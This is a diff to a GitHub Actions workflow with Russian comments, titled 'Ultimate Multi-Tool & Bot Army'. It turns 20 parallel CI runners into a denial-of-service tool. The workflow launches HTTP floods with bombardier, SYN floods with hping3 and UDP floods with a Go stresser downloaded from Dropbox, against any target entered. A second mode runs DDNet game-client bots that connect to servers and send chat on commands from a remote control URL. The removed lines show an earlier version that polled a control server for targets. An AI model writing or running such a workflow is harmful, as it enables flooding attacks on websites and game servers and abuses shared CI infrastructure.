@@ -1,92 +1,136 @@
-name: Ultimate Multi-Tool (Remote Control)
+name: Ultimate Multi-Tool & Bot Army
+
 on:
   workflow_dispatch:
+    inputs:
+      mode:
+        description: 'Выберите режим'
+        required: true
+        default: 'stress'
+        type: choice
+        options:
+          - stress
+          - ddnet_army
+      method:
+        description: 'Метод (только для Stress)'
+        required: false
+        default: 'http'
+        type: choice
+        options:
+          - http
+          - tcp
+          - udp
+          - udp-ddnet
+      target:
+        description: 'Цель (URL/IP) для Stress'
+        required: false
+        default: '1.1.1.1'
+      port:
+        description: 'Порт (Stress/DDNet)'
+        required: false
+        default: '8303'
+      connections:
+        description: 'Потоки/Соединения'
+        required: false
+        default: '500'
 
 jobs:
-  str-test:
+  executor:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
       matrix:
-        # Теперь 20 потоков одновременно
         runner: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
-
+    
     steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-
-      - name: Setup Tools
+      - name: Install All Dependencies
         run: |
           sudo apt-get update
-          sudo apt-get install -y hping3 golang-go wget curl jq
+          sudo apt-get install -y hping3 golang-go wget curl xvfb xdotool jq \
+          libsdl2-2.0-0 libcurl4 libfreetype6 libgl1 libglx-mesa0 \
+          libglu1-mesa libnotify4 libpng16-16 libvorbisfile3 libgl1-mesa-dri openbox
           
-          # Установка лимитов
-          sudo prlimit --pid $$ --nofile=65535:65535
-          
-          # Установка bombardier
-          wget -q https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64 -O bombardier
-          chmod +x bombardier && sudo mv bombardier /usr/local/bin/
-          
-          # Компиляция
-          go build -o bombarida_bin bombarida.go
-          chmod +x bombarida_bin
+          # Bombardier
+          wget https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64
+          chmod +x bombardier-linux-amd64
+          sudo mv bombardier-linux-amd64 /usr/local/bin/bombardier
 
-      - name: Control Loop
-        env:
-          URL: "https://me5years.alwaysdata.net/index.php?action=get"
+      - name: Prepare Tools
         run: |
-          set +e
-          ulimit -n 65535
-          LAST_ID=$(curl -s --connect-timeout 5 "$URL" | jq -r '.id // 0')
+          # Скачиваем стрессер Bombarida
+          wget -O bombarida.go "https://www.dropbox.com/scl/fi/zomtm1n4fk8c9bhigxo6c/bombarida.go?rlkey=7axesdmxaztkxo7ie55uybp3m&st=lgr6k8u6&dl=1"
           
-          while true; do
-            DATA=$(curl -s --connect-timeout 5 "$URL")
+          # Скачиваем DDNet
+          LINK=$(curl -s https://ddnet.org/downloads/ | grep -o 'href="[^"]*linux_x86_64\.tar\.xz"' | head -n 1 | cut -d'"' -f2)
+          curl -L -o ddnet.tar.xz "https://ddnet.org/downloads/$LINK"
+          tar -xf ddnet.tar.xz
+          mv DDNet-* ddnet_folder
+
+      - name: Execution Loop
+        env:
+          CONTROL_URL: "https://твой-сайт.alwaysdata.net/index.php?action=get" # ЗАМЕНИ НА СВОЙ
+          MODE: ${{ github.event.inputs.mode }}
+          METHOD: ${{ github.event.inputs.method }}
+          TARGET: ${{ github.event.inputs.target }}
+          PORT: ${{ github.event.inputs.port }}
+          CONNS: ${{ github.event.inputs.connections }}
+        run: |
+          if [ "$MODE" == "stress" ]; then
+            echo "Запуск стресс-теста: $METHOD на $TARGET"
+            if [ "$METHOD" == "http" ]; then
+              while true; do bombardier -c 1000 -d 300s --http2 -l "$TARGET?cache=$RANDOM"; done
+            elif [ "$METHOD" == "tcp" ]; then
+              sudo hping3 --flood -S -p $PORT $TARGET
+            elif [ "$METHOD" == "udp" ]; then
+              go run bombarida.go -mode client -addr "${TARGET}:${PORT}" -c $CONNS -n 0 -d 300s -r 0 -t 1s
+            elif [ "$METHOD" == "udp-ddnet" ]; then
+              go run bombarida.go -mode client -addr "${TARGET}:${PORT}" -ddnet-info -open-loop -c $CONNS -n 0 -d 300s -r 0 -t 1s
+            fi
+
+          else
+            echo "Запуск DDNet Bot Army"
+            export DISPLAY=:99
+            Xvfb :99 -screen 0 1024x768x24 +extension GLX +render -noreset & sleep 2
+            openbox & sleep 2
+            export LIBGL_ALWAYS_SOFTWARE=1
             
-            if echo "$DATA" | jq -e . >/dev/null 2>&1; then
-              ID=$(echo "$DATA" | jq -r '.id // 0')
+            cd ddnet_folder
+            for i in {1..2}; do
+              cat << EOF > "bot_${i}.cfg"
+              cl_show_welcome 0
+              cl_motd_time 0
+              player_name "Panda_${{ matrix.runner }}_$i"
+              cl_dummy_name "DUM_${{ matrix.runner }}_$i"
+              cl_dummy 1
+              cl_auto_ready 1
+              snd_enable 0
+              EOF
+              ./DDNet -f "bot_${i}.cfg" > /dev/null 2>&1 & sleep 2
+            done
 
-              if [[ "$ID" != "$LAST_ID" && "$ID" != "0" ]]; then
-                LAST_ID=$ID
-                METHOD=$(echo "$DATA" | jq -r '.method')
-                TARGET=$(echo "$DATA" | jq -r '.target')
-                PORT=$(echo "$DATA" | jq -r '.port')
-                CONNS=$(echo "$DATA" | jq -r '.conns // 500')
-
-                # Убиваем старье
-                sudo killall -9 bombardier hping3 bombarida_bin 2>/dev/null
-                sleep 1
-                
-                if [ "$METHOD" != "stop" ]; then
-                  echo "[ID $ID] RUNNING $METHOD ON $TARGET"
-
-                  if [ "$METHOD" == "http" ]; then
-                    # ФИКС ДЛЯ САЙТОВ: Проверяем наличие http://
-                    URL_TO_HIT="$TARGET"
-                    if [[ "$URL_TO_HIT" != http* ]]; then URL_TO_HIT="http://$URL_TO_HIT"; fi
-                    
-                    # Если указан порт и это не стандартные 80/443
-                    if [[ -n "$PORT" && "$PORT" != "80" && "$PORT" != "443" ]]; then
-                       URL_TO_HIT="${URL_TO_HIT}:${PORT}"
+            LAST_ID=$(curl -s --max-time 2 "$CONTROL_URL" | jq -r '.id // 0')
+            while true; do
+              RAW_RESPONSE=$(curl -s --max-time 2 "$CONTROL_URL")
+              if echo "$RAW_RESPONSE" | jq -e . >/dev/null 2>&1; then
+                ID=$(echo "$RAW_RESPONSE" | jq -r '.id // 0')
+                if [[ "$ID" != "$LAST_ID" && "$ID" != "0" ]]; then
+                  LAST_ID=$ID
+                  TYPE=$(echo "$RAW_RESPONSE" | jq -r '.type')
+                  VAL=$(echo "$RAW_RESPONSE" | jq -r '.value')
+                  WIDS=$(xdotool search --class "DDNet" 2>/dev/null)
+                  for WID in $WIDS; do
+                    xdotool windowactivate --sync $WID 2>/dev/null
+                    if [ "$TYPE" == "connect" ]; then
+                      xdotool key --window $WID F1; sleep 0.2
+                      xdotool type --window $WID "connect $VAL"; xdotool key --window $WID Return; sleep 0.2; xdotool key --window $WID F1
+                    elif [ "$TYPE" == "chat" ]; then
+                      xdotool key --window $WID t; sleep 0.2; xdotool type --window $WID "$VAL"; xdotool key --window $WID Return
+                    elif [ "$TYPE" == "disconnect" ]; then
+                      xdotool key --window $WID F1; sleep 0.2; xdotool type --window $WID "disconnect"; xdotool key --window $WID Return; sleep 0.2; xdotool key --window $WID F1
                     fi
-
-                    # Запуск bombardier (без вывода в лог, чтобы не спамить)
-                    bombardier -c "$CONNS" -d 3600s --http2 -l "$URL_TO_HIT" > /dev/null 2>&1 &
-                  
-                  elif [ "$METHOD" == "tcp" ]; then
-                    sudo hping3 --flood -S -p "$PORT" "$TARGET" > /dev/null 2>&1 &
-                  
-                  elif [ "$METHOD" == "udp" ]; then
-                    ./bombarida_bin -addr "${TARGET}:${PORT}" -c "$CONNS" -d 3600s &
-                  
-                  elif [ "$METHOD" == "udp-ddnet" ]; then
-                    ./bombarida_bin -addr "${TARGET}:${PORT}" -ddnet-info -c "$CONNS" -d 3600s &
-                  fi
+                  done
                 fi
               fi
-            fi
-            
-            # Раз в 5 минут чистим кэш системы, чтобы не тормозила
-            sudo sync; echo 3 | sudo tee /proc/sys/vm/drop_caches > /dev/null
-            
-            sleep 5
-          done
+              sleep 2
+            done
+          fi
